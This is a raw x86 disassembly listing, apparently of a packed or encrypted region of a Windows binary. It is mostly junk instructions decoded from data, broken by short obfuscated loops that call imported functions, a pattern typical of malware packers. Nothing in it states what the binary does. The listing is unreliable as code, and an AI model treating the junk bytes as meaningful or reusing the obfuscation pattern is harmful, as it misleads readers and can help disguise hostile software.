  4067b4:	xor    BYTE PTR [edx-0xa],ch
  4067b7:	mov    eax,ds:0xf4ab2198
  4067bc:	mov    cl,ch
  4067be:	sub    dh,BYTE PTR [edi-0x5f]
  4067c1:	imul   edx,esi,0xda6cf9c
  4067c7:	mov    eax,0xc0d4c8a1
  4067cc:	dec    esp
  4067cd:	jbe    0x406767
  4067cf:	out    0xc7,al
  4067d1:	les    edx,FWORD PTR [esi]
  4067d3:	jle    0x406850
  4067d5:	sbb    bh,BYTE PTR [esi+0x257ac6f7]
  4067db:	stos   DWORD PTR es:[edi],eax
  4067dc:	push   ebx
  4067dd:	xchg   esp,eax
  4067de:	(bad)  
  4067df:	retf   0x158a
  4067e2:	aam    0xe9
  4067e4:	int    0x3c
  4067e6:	in     eax,dx
  4067e7:	iret   
  4067e8:	aas    
  4067e9:	cmp    eax,0x6835e147
  4067ee:	sbb    bl,dh
  4067f0:	inc    ebx
  4067f1:	adc    ebx,DWORD PTR [edx+edx*1]
  4067f4:	jecxz  0x406850
  4067f6:	sbb    al,0x66
  4067f8:	push   0xffffffcc
  4067fa:	xchg   esp,eax
  4067fb:	test   DWORD PTR [ebx-0x728e800a],ebp
  406801:	idiv   DWORD PTR [esi]
  406803:	icebp  
  406804:	lock retf 0x2a3c
  406808:	ins    BYTE PTR es:[edi],dx
  406809:	adc    al,BYTE PTR [esi]
  40680b:	mov    BYTE PTR [esp+eax*4+0x77e2b994],al
  406812:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406813:	in     eax,0x38
  406815:	mov    dl,0x2c
  406817:	jno    0x4067b1
  406819:	loop   0x40680e
  40681b:	dec    ebx
  40681c:	jnp    0x40687a
  40681e:	data16 or cl,bl
  406821:	leave  
  406822:	ja     0x40688d
  406824:	pop    esi
  406825:	xor    eax,DWORD PTR [ecx+0x4]
  406828:	mov    ah,0x23
  40682a:	ficomp WORD PTR [eax]
  40682c:	retf   0xafd8
  40682f:	mov    ecx,0x88aa9dad
  406834:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406835:	(bad)  
  406836:	cli    
  406837:	xor    ebx,ebp
  406839:	fnsave [edx+ebx*4+0x4f]
  40683d:	xchg   ebx,eax
  40683e:	or     BYTE PTR [edx+0x79],ch
  406841:	mov    eax,ds:0x12dee9d8
  406846:	or     al,0x3a
  406848:	test   al,0x5f
  40684a:	hlt    
  40684b:	mov    al,ds:0xd7906bbe
  406850:	adc    DWORD PTR [esi],ecx
  406852:	repnz push ds
  406854:	clc    
  406855:	dec    ebx
  406856:	rcl    DWORD PTR [ebx-0x71],cl
  406859:	popa   
  40685a:	std    
  40685b:	mov    al,0x88
  40685d:	test   al,0x85
  40685f:	xchg   ebp,eax
  406860:	pop    es
  406861:	pop    ecx
  406862:	pop    es
  406863:	xchg   edi,eax
  406864:	add    ebp,DWORD PTR [eax]
  406866:	adc    eax,0xff7b2c7b
  40686b:	ror    BYTE PTR [eax-0x7b7d0d36],0xee
  406872:	loope  0x4068ca
  406874:	add    ah,BYTE PTR [edx+0x542026ab]
  40687a:	jbe    0x4068eb
  40687c:	addr16 es pop ebp
  40687f:	sbb    eax,0xab098a95
  406884:	or     eax,0x25618311
  406889:	inc    ecx
  40688a:	cld    
  40688b:	inc    esi
  40688c:	inc    eax
  40688d:	xchg   edi,eax
  40688e:	pushf  
  40688f:	loope  0x4068ba
  406891:	lods   al,BYTE PTR ds:[esi]
  406892:	push   ebp
  406893:	xor    esi,esp
  406895:	dec    esp
  406896:	jle    0x406893
  406898:	add    ch,bl
  40689a:	xor    cl,BYTE PTR [ebp-0x42]
  40689d:	mov    eax,ds:0x8a64761f
  4068a2:	mov    ebp,0xff0b52a2
  4068a7:	test   al,0xf3
  4068a9:	or     esp,DWORD PTR [eax+ebp*1-0x1fdd9d92]
  4068b0:	mov    al,dh
  4068b2:	pop    es
  4068b3:	out    0xaa,eax
  4068b5:	int    0xbe
  4068b7:	fist   DWORD PTR ss:[ebx+esi*2-0x1f]
  4068bc:	mov    edx,0x3215c8eb
  4068c1:	mov    WORD PTR [ebx+ebp*2],ds
  4068c4:	add    dh,BYTE PTR [edi+ebp*8-0x316cb480]
  4068cb:	add    esp,0x65b53fe3
  4068d1:	fnstenv [edi]
  4068d3:	mov    dl,0x5d
  4068d5:	ret    0x18
  4068d8:	push   ebp
  4068d9:	mov    ebp,esp
  4068db:	sub    esp,0x58
  4068de:	mov    DWORD PTR ds:0x42a7bd,0x1f
  4068e8:	cmp    DWORD PTR ds:0x42a7bd,0x0
  4068ef:	je     0x406947
  4068f5:	cmp    DWORD PTR ds:0x42a7bd,0x8
  4068fc:	jne    0x406916
  406902:	push   DWORD PTR [ebp-0x1c]
  406905:	push   DWORD PTR [ebp-0x24]
  406908:	push   0x42aaaa
  40690d:	push   DWORD PTR [ebp-0x10]
  406910:	call   DWORD PTR ds:0x41d18c
  406916:	cmp    DWORD PTR ds:0x42a7bd,0x9
  40691d:	jne    0x406931
  406923:	xor    eax,eax
  406925:	or     eax,DWORD PTR ds:0x42a7bd
  40692b:	dec    eax
  40692c:	mov    ds:0x42a7bd,eax
  406931:	mov    eax,ds:0x42a7bd
  406936:	dec    eax
  406937:	mov    ds:0x42a7bd,eax
  40693c:	jmp    0x4068e8
  406941:	and    DWORD PTR ds:0x42a769,edx
  406947:	mov    ecx,DWORD PTR [ebp+0x8]
  40694a:	jmp    0x406c53
  40694f:	int3   
  406950:	(bad)
  406953:	(bad)  
  406955:	fcmove st,st(1)
  406957:	in     eax,dx
  406958:	loop   0x406947
  40695a:	out    dx,eax
  40695b:	iret   
  40695c:	fs jle 0x406976
  40695f:	add    cl,cl
  406961:	js     0x4069db
  406963:	fs jle 0x4069de
  406966:	js     0x406992
  406968:	in     al,0x4d
  40696a:	jns    0x406988
  40696c:	(bad)  
  40696d:	cmp    DWORD PTR [esi+0x39027514],ecx
  406973:	jb     0x4069af
  406975:	les    edi,FWORD PTR [esi]
  406977:	sub    eax,0x31289dc2
  40697c:	ror    BYTE PTR [esi-0x7760e7c0],0x1a
  406983:	adc    bl,BYTE PTR [edi]
  406985:	dec    ebx
  406986:	jmp    0x770f7ac6
  40698b:	sub    DWORD PTR [edi+0x49849378],ebx
  406991:	sub    eax,esi
  406993:	mov    dh,0x9a
  406995:	push   edx
  406996:	and    ch,bh
  406998:	dec    edi
  406999:	and    DWORD PTR [ecx+0x13],eax
  40699c:	inc    edx
  40699d:	aad    0x8b
  40699f:	and    BYTE PTR [eax+0x73],0xea
  4069a3:	mov    esp,0x23e9838b
  4069a8:	ficomp DWORD PTR [ebx+0x3d]
  4069ab:	int    0x95
  4069ad:	fistp  WORD PTR [eax+eax*4-0x84d681e]
  4069b4:	call   0x2cc4:0x146a4e1f
  4069bb:	adc    DWORD PTR [edx+0x2e],0xffffffa9
  4069bf:	and    al,0x4a
  4069c1:	adc    dl,BYTE PTR [ebp-0x1b]
  4069c4:	loop   0x406957
  4069c6:	and    eax,DWORD PTR [ebp+ecx*2-0x1]
  4069ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4069cb:	add    BYTE PTR [ecx],0xca
  4069ce:	add    bh,ah
  4069d0:	or     ch,bh
  4069d2:	loopne 0x406993
  4069d4:	mov    ecx,0xd828a492
  4069d9:	xchg   ecx,eax
  4069da:	add    al,0x3f
  4069dc:	jle    0x406a59
  4069de:	mov    WORD PTR [ecx-0xa81996b],ss
  4069e4:	lods   eax,DWORD PTR ds:[esi]
  4069e5:	push   cs
  4069e6:	mov    edi,0x9a9ae141
  4069eb:	call   0xe75d:0xed26b556
  4069f2:	cmp    al,0x96
  4069f4:	aad    0xb7
  4069f6:	pop    edi
  4069f7:	mov    ebx,0xdc9ccdb4
  4069fc:	les    ecx,FWORD PTR [eax+eax*4+0x24044e00]
  406a03:	mov    esi,DWORD PTR [edi+0x131924ef]
  406a09:	dec    edx
  406a0a:	outs   dx,DWORD PTR ds:[esi]
  406a0b:	(bad)  
  406a0c:	sti    
  406a0d:	add    BYTE PTR [eax+0x7eb60e24],ah
  406a13:	and    ebp,DWORD PTR [edi+esi*2+0x4a]
  406a17:	xor    ch,ah
  406a19:	adc    eax,ebx
  406a1b:	ret    0x1602
  406a1e:	pushf  
  406a1f:	popa   
  406a20:	jb     0x406a91
  406a22:	mov    DWORD PTR [eax],eax
  406a24:	mov    ecx,0x6805fc05
  406a29:	sub    eax,0x36887da
  406a2e:	jmp    0x3fd0:0xdcff9c12
  406a35:	mov    bh,0xec
  406a37:	add    DWORD PTR [edi],edx
  406a39:	test   al,0x44
  406a3b:	inc    esp
  406a3c:	jge    0x406a70
  406a3e:	mov    dl,0xa9
  406a40:	sbb    esi,DWORD PTR [edi]
  406a42:	jge    0x4069c4
  406a44:	jmp    0xf446a9a0
  406a49:	and    DWORD PTR [esi],eax
  406a4b:	(bad)  
  406a4c:	loopne 0x4069d1
  406a4e:	dec    ebx
  406a4f:	sbb    al,0xea
  406a51:	cmp    al,0x29
  406a53:	das    
  406a54:	or     al,0xb2
  406a56:	xor    ebp,DWORD PTR [edi]
  406a58:	ds push ebp
  406a5a:	test   al,0x2f
  406a5c:	out    dx,al
  406a5d:	(bad)  
  406a5e:	pop    ds
  406a5f:	push   eax
  406a60:	pop    edi
  406a61:	fnstcw WORD PTR [eax+0x51f63bf0]
  406a67:	push   ds
  406a68:	pushf  
  406a69:	imul   esi,DWORD PTR [ebx-0x72],0x41
  406a6d:	les    esi,FWORD PTR [edx+0x67]
  406a70:	(bad)  
  406a71:	iret   
  406a72:	sbb    BYTE PTR [eax],bl
  406a74:	jo     0x406a3d
  406a76:	cmp    bl,BYTE PTR [esi+0x5]
  406a79:	popf   
  406a7a:	inc    eax
  406a7b:	repnz mov ch,0x61
  406a7e:	shr    DWORD PTR [ebp+0x38],cl
  406a81:	enter  0x7e7e,0x8
  406a85:	rcl    ebx,0x5c
  406a88:	mov    ds:0xa8225ce3,al
  406a8d:	dec    ebx
  406a8e:	cmp    BYTE PTR [ebx+ecx*8-0x42],bh
  406a92:	test   DWORD PTR [edi+ebx*1-0x79],edx
  406a96:	ror    BYTE PTR [eax-0x43],0x79
  406a9a:	add    eax,0xc47e7248
  406a9f:	test   DWORD PTR [esi+ebp*2],edx
  406aa2:	mov    DWORD PTR [eax-0x5f],esp
  406aa5:	test   al,0x43
  406aa7:	push   eax
  406aa8:	and    al,0x81
  406aaa:	jbe    0x406aa5
  406aac:	fmul   QWORD PTR [ebx+eiz*4]
  406aaf:	out    dx,al
  406ab0:	xchg   edi,eax
  406ab1:	jbe    0x406b1c
  406ab3:	sub    al,0xb
  406ab5:	in     eax,dx
  406ab6:	mov    ecx,edx
  406ab8:	sub    DWORD PTR [esi-0x2f],ebp
  406abb:	mov    ds:0xce579883,al
  406ac0:	aam    0x2e
  406ac2:	pop    edx
  406ac3:	addr16 cmc 
  406ac5:	enter  0xd574,0x8e
  406ac9:	(bad)
  406acc:	fiadd  WORD PTR [edi+0x57]
  406acf:	cmp    al,bl
  406ad1:	cmp    ebx,DWORD PTR [esi+0x6c]
  406ad4:	or     ebp,DWORD PTR [ebx-0x1f]
  406ad7:	cmp    DWORD PTR [edx-0x7f],edi
  406ada:	inc    eax
  406adb:	iret   
  406adc:	sub    DWORD PTR cs:[ebp+0x25ec1391],esp
  406ae3:	loop   0x406ab8
  406ae5:	bound  edi,QWORD PTR [edi+esi*2+0x28]
  406ae9:	pop    esp
  406aea:	xchg   BYTE PTR [ebx+0x8],dl
  406aed:	popf   
  406aee:	daa    
  406aef:	add    al,0xba
  406af1:	push   0xb865bc82
  406af6:	push   edi
  406af7:	fdiv   QWORD PTR [eax+0x16]
  406afa:	test   al,0x71
  406afc:	jbe    0x406b3f
  406afe:	out    0xf5,eax
  406b00:	inc    ebx
  406b01:	icebp  
  406b02:	add    eax,0x198787c5
  406b07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b08:	push   ds
  406b09:	sub    al,0xb7
  406b0b:	xor    ebp,ebp
  406b0d:	ja     0x406ae7
  406b0f:	jecxz  0x406b80
  406b11:	clc    
  406b12:	js     0x406aaf
  406b14:	or     bh,ch
  406b16:	and    DWORD PTR [ecx-0xf],ebx
  406b19:	(bad)  
  406b1a:	retf   
  406b1b:	mov    al,ds:0x470098c7
  406b20:	jg     0x406ac2
  406b22:	aam    0xc2
  406b24:	shl    BYTE PTR [edi-0x851e4a1],cl
  406b2a:	xchg   esp,eax
  406b2b:	jg     0x406b15
  406b2d:	inc    edi
  406b2e:	bound  esi,QWORD PTR [ebx]
  406b30:	or     dh,BYTE PTR [edx+eiz*2-0x58]
  406b34:	stc    
  406b35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b36:	jmp    0x2053:0x458f95aa
  406b3d:	adc    ecx,DWORD PTR [ebx+eiz*8-0x3dff4d0c]
  406b44:	das    
  406b45:	push   0x61
  406b47:	inc    ebp
  406b48:	add    eax,0xeeb5bee8
  406b4d:	push   0xca483239
  406b52:	idiv   al
  406b54:	iret   
  406b55:	aas    
  406b56:	pop    ecx
  406b57:	lea    esi,[eax+esi*2]
  406b5a:	cmp    dl,BYTE PTR [ebp-0x49591837]
  406b60:	out    dx,al
  406b61:	fdiv   DWORD PTR [edx+eax*8+0x1892cf96]
  406b68:	ret    0x10c
  406b6b:	rol    BYTE PTR [ecx],cl
  406b6d:	add    DWORD PTR [esi+edx*4+0x4489fc03],ebx
  406b74:	hlt    
  406b75:	out    dx,al
  406b76:	scas   al,BYTE PTR es:[edi]
  406b77:	xchg   BYTE PTR [edx+0x1a80c215],dl
  406b7d:	imul   ebp,DWORD PTR [ebp-0x29a892e0],0x7c
  406b84:	lea    edi,[ecx-0x24]
  406b87:	mov    dl,0xc7
  406b89:	into   
  406b8a:	retf   
  406b8b:	sti    
  406b8c:	push   ecx
  406b8d:	xor    DWORD PTR [bx-0x11],ebx
  406b91:	fs xchg esp,eax
  406b93:	cmp    ah,BYTE PTR [ebp+0x4403f60e]
  406b99:	cld    
  406b9a:	inc    ecx
  406b9b:	test   DWORD PTR [edi-0x8],ebp
  406b9e:	sbb    BYTE PTR [edi-0x23],bh
  406ba1:	adc    esp,DWORD PTR [edx+0x7205a30d]
  406ba7:	repnz lds esp,FWORD PTR [ebx]
  406baa:	xchg   edx,eax
  406bab:	sbb    al,0x5b
  406bad:	add    eax,0x61b78f48
  406bb2:	add    al,0xfd
  406bb4:	or     al,0x3c
  406bb6:	push   ebp
  406bb8:	cwde   
  406bb9:	daa    
  406bba:	sbb    eax,0x7b8fa35d
  406bbf:	add    eax,0xc63bb1ed
  406bc4:	and    al,0xfc
  406bc6:	xchg   edx,eax
  406bc7:	in     al,dx
  406bc8:	or     DWORD PTR [eax-0x5bffa71b],edx
  406bce:	dec    ebp
  406bcf:	ds fcmove st,st(7)
  406bd2:	mov    esp,0xf98dbc5f
  406bd7:	xor    BYTE PTR [ebx+0x22],dh
  406bda:	sub    eax,0x72f857cf
  406bdf:	fldenv [bx+di]
  406be2:	cld    
  406be3:	rol    DWORD PTR [esi+0x7ed14f2c],cl
  406be9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406bea:	mov    ds:0x9a449db7,eax
  406bef:	push   edx
  406bf0:	pop    ss
  406bf1:	inc    edi
  406bf2:	dec    edi
  406bf3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406bf4:	or     ecx,DWORD PTR [eax-0x44]
  406bf7:	dec    edx
  406bf8:	pop    esi
  406bf9:	mov    dl,0x1c
  406bfb:	jae    0x406bdd
  406bfd:	stos   BYTE PTR es:[edi],al
  406bfe:	test   al,0x1f
  406c00:	mov    esi,0xba2b6b0a
  406c05:	sbb    al,0x39
  406c07:	push   ecx
  406c08:	rcr    DWORD PTR [eax+eiz*4+0x782e2bf1],cl
  406c0f:	fsubp  st(0),st
  406c11:	adc    DWORD PTR [ecx+0x42],esi
  406c14:	(bad)  
  406c15:	mov    ds:0xc12fec2,eax
  406c1a:	leave  
  406c1b:	pop    ss
  406c1c:	repnz or dl,BYTE PTR [ecx-0x66f6f8b5]
  406c23:	push   ebx
  406c24:	sbb    BYTE PTR [edi],0xd
  406c27:	ins    BYTE PTR es:[edi],dx
  406c28:	jmp    DWORD PTR [edx]
  406c2a:	jbe    0x406be0
  406c2c:	and    eax,0xde956559
  406c31:	sbb    BYTE PTR [ebx],dl
  406c33:	in     eax,dx
  406c34:	call   0x8e9e5f79
  406c39:	xchg   esp,eax
  406c3a:	aad    0xe1
  406c3c:	rcr    BYTE PTR [ebp-0x63],cl
  406c3f:	sub    eax,ebx
  406c41:	in     al,dx
  406c42:	mov    edi,0xd23e112f
  406c47:	jne    0x406c64
  406c49:	int3   
  406c4a:	stos   DWORD PTR es:[edi],eax
  406c4b:	fsubr  DWORD PTR [ecx+0x268e31f8]
  406c51:	push   0x10
  406c53:	mov    eax,0x8a36
  406c58:	adc    DWORD PTR ds:0x42a7c9,0x4fea
  406c62:	xor    ax,WORD PTR [ecx+0x20]
  406c66:	sub    DWORD PTR ds:0x42a7f5,0x417a
  406c70:	mov    ecx,0x3afc
  406c75:	xor    DWORD PTR ds:0x42a84d,0x2c9d
  406c7f:	jmp    0x406f88
  406c84:	rol    dh,cl
  406c86:	cmp    al,0xd3
  406c88:	aam    0xd9
  406c8a:	rol    ebp,1
  406c8c:	mov    eax,ebx
  406c8e:	and    DWORD PTR [ecx-0x1],ebx
  406c91:	push   edi
  406c92:	fdivr  QWORD PTR [edx+0x6c]
  406c95:	iret   
  406c96:	js     0x406d10
  406c98:	fs jle 0x406d13
  406c9b:	js     0x406ca9
  406c9d:	jl     0x406cf1
  406c9f:	jmp    FWORD PTR ds:[edi-0x5d]
  406ca3:	int3   
  406ca4:	pushf  
  406ca5:	ret    0xd1d2
  406ca8:	das    
  406ca9:	mov    eax,ds:0x55fbd598
  406cae:	and    DWORD PTR [edx],edx
  406cb0:	mov    esp,0xc1fb0b39
  406cb5:	pop    ebp
  406cb6:	jge    0x406c9a
  406cb8:	scas   al,BYTE PTR es:[edi]
  406cb9:	sub    ebp,esp
  406cbb:	cmp    al,0x26
  406cbd:	sbb    DWORD PTR [edx-0x63b58c8c],esi
  406cc3:	cmc    
  406cc4:	out    0x36,eax
  406cc6:	sbb    ah,dh
  406cc8:	add    eax,0xd4ddaae7
  406ccd:	call   0xf2a3:0x64b28d6d
  406cd4:	and    eax,DWORD PTR [ebp-0x3e]
  406cd7:	arpl   WORD PTR [edx-0x282080f2],bp
  406cdd:	mov    eax,ds:0xc497d7e3
  406ce2:	push   es
  406ce3:	fnstcw WORD PTR [edx-0x2e]
  406ce6:	xchg   ecx,eax
  406ce7:	jno    0x406cc0
  406ce9:	in     al,0x14
  406ceb:	push   ecx
  406cec:	dec    esi
  406ced:	pop    edi
  406cee:	out    dx,eax
  406cef:	jns    0x2d85e5
  406cf5:	push   0x42
  406cf7:	push   ebx
  406cf8:	stc    
  406cf9:	aas    
  406cfa:	(bad)  
  406cfb:	(bad)  
  406cfc:	sub    ecx,esp
  406cfe:	inc    ebx
  406cff:	into   
  406d00:	xchg   DWORD PTR [ebx+0xc7d35ac],esp
  406d06:	shl    BYTE PTR [ecx+ebx*4+0x2d0766b1],0xd9
  406d0e:	add    bl,bl
  406d10:	push   edi
  406d11:	xchg   ebx,eax
  406d12:	into   
  406d13:	loopne 0x406d74
  406d15:	mov    dh,0x42
  406d17:	repnz pop ds
  406d19:	jle    0x406d7d
  406d1b:	jecxz  0x406cbe
  406d1d:	jne    0x406cd6
  406d1f:	sbb    al,0xcb
  406d21:	sbb    eax,0x827750bd
  406d26:	xchg   edi,eax
  406d27:	push   0xffffffd8
  406d29:	jae    0x406d6a
  406d2b:	jne    0x406cb1
  406d2d:	or     ah,BYTE PTR [ecx+0x68]
  406d30:	push   esp
  406d31:	and    ch,BYTE PTR [edi]
  406d33:	clc    
  406d34:	in     eax,0xfd
  406d36:	cmp    BYTE PTR [edi-0x68949fb7],bl
  406d3c:	xchg   BYTE PTR [eax-0x17],ch
  406d3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d40:	aas    
  406d41:	adc    BYTE PTR [bp-0x51d8],bh
  406d46:	inc    edi
  406d47:	add    edx,edx
  406d49:	aam    0x7d
  406d4b:	(bad)  
  406d4c:	jns    0x406d58
  406d4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d4f:	pop    es
  406d50:	out    0x22,al
  406d52:	or     al,0xb
  406d54:	xchg   bh,ah
  406d56:	scas   eax,DWORD PTR es:[edi]
  406d57:	mov    edx,0xdae080b6
  406d5c:	sub    esp,DWORD PTR [eax+0x28]
  406d5f:	(bad)  
  406d60:	xchg   ebx,eax
  406d61:	sub    al,ah
  406d63:	test   al,0x71
  406d65:	mov    ebx,0x332908af
  406d6a:	sbb    al,0xec
  406d6c:	aaa    
  406d6d:	into   
  406d6e:	push   esi
  406d6f:	arpl   WORD PTR [ebx+0x63],ax
  406d72:	adc    eax,0xee10754d
  406d77:	fbld   TBYTE PTR [esi*8+0x737ddf76]
  406d7e:	or     eax,0x52a82b1c
  406d83:	js     0x406d08
  406d85:	es jb  0x406d1a
  406d88:	pop    ebx
  406d89:	push   ecx
  406d8a:	or     esp,0x8b3a8118
  406d90:	or     ecx,DWORD PTR [esi+0xef8e377]
  406d96:	or     ecx,edi
  406d98:	jb     0x406dd7
  406d9a:	mov    al,ds:0xff0e002e
  406d9f:	daa    
  406da0:	ficomp WORD PTR cs:[ecx+0x75]
  406da4:	or     bh,BYTE PTR [edi-0x45]
  406da7:	mov    eax,ds:0xb67bb87
  406dac:	dec    ebx
  406dad:	jp     0x406e2d
  406daf:	push   cs
  406db0:	xor    DWORD PTR [eax+0x72],eax
  406db3:	mov    al,ds:0xb0ab47c5
  406db8:	daa    
  406db9:	fnstcw WORD PTR [edx+0x4d022a31]
  406dbf:	pop    edi
  406dc0:	push   edx
  406dc1:	mov    dh,0xad
  406dc3:	test   DWORD PTR [ebx],edx
  406dc5:	pop    edx
  406dc6:	fsubr  st,st(1)
  406dc8:	pop    esp
  406dc9:	stc    
  406dca:	sub    al,0xdb
  406dcc:	or     eax,DWORD PTR [edx+0x3b]
  406dcf:	push   edx
  406dd0:	adc    ah,BYTE PTR [ebp+0x65]
  406dd3:	cli    
  406dd4:	add    eax,0x97835e03
  406dd9:	es pop edi
  406ddb:	dec    edi
  406ddc:	je     0x406d99
  406dde:	in     al,dx
  406ddf:	outs   dx,BYTE PTR ds:[esi]
  406de0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406de1:	int3   
  406de2:	xchg   ecx,eax
  406de3:	mov    al,ds:0x7a624940
  406de8:	shl    DWORD PTR [ebp-0x5a],cl
  406deb:	sbb    al,0x99
  406ded:	dec    BYTE PTR [edx-0x76f28a9b]
  406df3:	jmp    0x406e70
  406df5:	push   ecx
  406df6:	test   DWORD PTR [ebx],esp
  406df8:	popa   
  406df9:	lahf   
  406dfa:	jecxz  0x406e08
  406dfc:	pop    esp
  406dfd:	or     ah,BYTE PTR fs:[edi-0x1d]
  406e01:	and    al,0x4e
  406e03:	xchg   BYTE PTR [esi],cl
  406e05:	sub    al,0xe3
  406e07:	mov    ecx,0x1bca4534
  406e0c:	scas   al,BYTE PTR es:[edi]
  406e0d:	loopne 0x406da2
  406e0f:	sahf   
  406e10:	in     al,0x24
  406e12:	arpl   di,bx
  406e14:	mov    eax,0xd092a147
  406e19:	add    edx,DWORD PTR [esi-0x3c4f9975]
  406e1f:	fidivr DWORD PTR [ebx-0x3ccb9411]
  406e25:	add    eax,DWORD PTR [ebx+0x6ecb8b2c]
  406e2b:	xchg   ecx,eax
  406e2c:	adc    al,0xbd
  406e2e:	or     ch,BYTE PTR [edi-0x5109d192]
  406e34:	jns    0x406e9b
  406e36:	mov    edi,0x992f6fb9
  406e3b:	loope  0x406e52
  406e3d:	loopne 0x406de4
  406e3f:	dec    ebp
  406e40:	pop    edx
  406e41:	sahf   
  406e42:	push   esi
  406e43:	not    BYTE PTR [esi-0x15]
  406e46:	(bad)  
  406e47:	cmp    edi,DWORD PTR [ebx]
  406e49:	mov    edx,0x836c2b24
  406e4e:	js     0x406dda
  406e50:	in     al,0x1a
  406e52:	hlt    
  406e53:	sub    ecx,DWORD PTR [edi+0x1b]
  406e56:	(bad)  [eax-0x1d]
  406e59:	mov    ds:0x67416366,eax
  406e5e:	ins    BYTE PTR es:[edi],dx
  406e5f:	mov    al,0x56
  406e61:	inc    esp
  406e62:	clc    
  406e63:	call   0x6ae7e7a5
  406e68:	dec    ecx
  406e69:	aad    0x85
  406e6b:	cmp    al,0x0
  406e6d:	push   es
  406e6e:	div    DWORD PTR [ebx+0x71360a0e]
  406e74:	out    0xaf,eax
  406e76:	mov    eax,ds:0x3a47cba7
  406e7b:	mov    eax,ds:0xed7124c8
  406e80:	jecxz  0x406eb5
  406e82:	test   BYTE PTR [ebp-0x362c9a61],ch
  406e88:	gs (bad) 
  406e8a:	nop
  406e8b:	sti    
  406e8c:	pop    esi
  406e8d:	add    edi,edx
  406e8f:	dec    esp
  406e90:	clc    
  406e91:	std    
  406e92:	shl    BYTE PTR ds:0x46a646ba,cl
  406e98:	mov    edx,0x5232e272
  406e9d:	das    
  406e9e:	jge    0x406f07
  406ea0:	sbb    ecx,ebp
  406ea2:	cmp    edi,DWORD PTR [ebp-0x4f]
  406ea5:	adc    al,0x23
  406ea7:	fcmovu st,st(3)
  406ea9:	cmp    ebx,DWORD PTR [edi+0x3b]
  406eac:	cmp    BYTE PTR [esi+eiz*2+0x726f0f14],cl
  406eb3:	fsubr  DWORD PTR [edx]
  406eb5:	jns    0x406e6a
  406eb7:	add    al,0xfc
  406eb9:	adc    al,0xd7
  406ebb:	lods   eax,DWORD PTR ds:[esi]
  406ebc:	adc    bh,BYTE PTR [esi+ebx*2]
  406ebf:	ret    0xf72e
  406ec2:	fcom   QWORD PTR [edx-0x61016a36]
  406ec8:	push   edx
  406ec9:	inc    ecx
  406eca:	loop   0x406f2c
  406ecc:	push   ebx
  406ecd:	frstor [ebx+0x18b4b814]
  406ed3:	dec    esp
  406ed4:	fwait
  406ed5:	cs jae 0x406f54
  406ed8:	add    dh,BYTE PTR [eax]
  406eda:	sbb    ebx,edi
  406edc:	mov    esi,0x5af6391f
  406ee1:	shl    BYTE PTR [edi-0x352cb96d],cl
  406ee7:	aad    0xfa
  406ee9:	sbb    BYTE PTR [ebx-0x5f938070],cl
  406eef:	dec    eax
  406ef0:	lahf   
  406ef1:	pusha  
  406ef2:	lock xor BYTE PTR [ebp-0x378b9640],ch
  406ef9:	xchg   esp,eax
  406efa:	ror    DWORD PTR [edi-0x271f39c5],0x2f
  406f01:	lds    edx,FWORD PTR [eax+0x6e]
  406f04:	mov    dl,0x15
  406f06:	daa    
  406f07:	push   edx
  406f08:	sub    ebx,esp
  406f0a:	ucomiss xmm7,DWORD PTR [eax+0x25bf803d]
  406f11:	push   ss
  406f12:	ret    
  406f13:	dec    edi
  406f14:	into   
  406f15:	retf   
  406f16:	xchg   ebx,eax
  406f17:	xchg   ebx,eax
  406f18:	outs   dx,BYTE PTR ds:[esi]
  406f19:	punpckhdq mm1,QWORD PTR [eax+0x61]
  406f1d:	cmpxchg DWORD PTR [edx-0x23],edx
  406f21:	in     al,0x5c
  406f23:	inc    edi
  406f24:	mov    ebx,esp
  406f26:	xchg   esp,eax
  406f27:	addr16 cld 
  406f29:	inc    esp
  406f2a:	jae    0x406f98
  406f2c:	jle    0x406f14
  406f2e:	jmp    0x406ef2
  406f30:	test   al,0x39
  406f32:	out    dx,al
  406f33:	push   ss
  406f34:	dec    ebp
  406f35:	jbe    0x406f93
  406f37:	cs into 
  406f39:	imul   ebp,DWORD PTR [ebp-0x4cee886a],0xffffffb4
  406f40:	inc    ecx
  406f41:	cmp    DWORD PTR [edi+0x290c9ff7],0xffffffa7
  406f48:	xchg   ebx,eax
  406f49:	jmp    0x406f90
  406f4b:	push   ds
  406f4c:	out    dx,eax
  406f4d:	or     BYTE PTR [edx],0xc0
  406f50:	ds inc ebx
  406f52:	arpl   WORD PTR [eax+ecx*2-0x10],dx
  406f56:	mov    ds:0x77dc34e0,al
  406f5b:	iret   
  406f5c:	inc    eax
  406f5d:	jge    0x406fb1
  406f5f:	or     DWORD PTR [bp+di-0x4f],esi
  406f63:	in     eax,0xad
  406f65:	pusha  
  406f66:	xchg   edi,eax
  406f67:	pop    edi
  406f68:	inc    ebp
  406f69:	aas    
  406f6a:	inc    esp
  406f6b:	rol    DWORD PTR [ecx-0x42],1
  406f6e:	aad    0x8f
  406f70:	call   0x67397d90
  406f75:	pop    esi
  406f76:	mov    BYTE PTR [ebx+0x7b],ah
  406f79:	jne    0x406f97
  406f7b:	push   ds
  406f7c:	pop    ds
  406f7d:	out    dx,al
  406f7e:	out    dx,eax
  406f7f:	mov    dh,0x8f
  406f81:	shl    DWORD PTR [esi-0x3e1776ac],0x7c
  406f88:	add    ax,cx
  406f8b:	sbb    ecx,DWORD PTR ds:0x42a881
  406f91:	movzx  eax,ax
  406f94:	and    DWORD PTR ds:0x42a885,0x0
  406f9e:	jmp    0x406fb0
  406fa3:	mov    ecx,DWORD PTR ds:0x42a885
  406fa9:	inc    ecx
  406faa:	mov    DWORD PTR ds:0x42a885,ecx
  406fb0:	cmp    DWORD PTR ds:0x42a885,0x11
  406fb7:	jae    0x407009
  406fbd:	cmp    DWORD PTR ds:0x42a885,0x7
  406fc4:	jne    0x406fe4
  406fca:	push   0x2396
  406fcf:	push   0x42ab22
  406fd4:	push   0x42ab22
  406fd9:	push   0x42ab04
  406fde:	call   DWORD PTR ds:0x41d190
  406fe4:	cmp    DWORD PTR ds:0x42a885,0x6
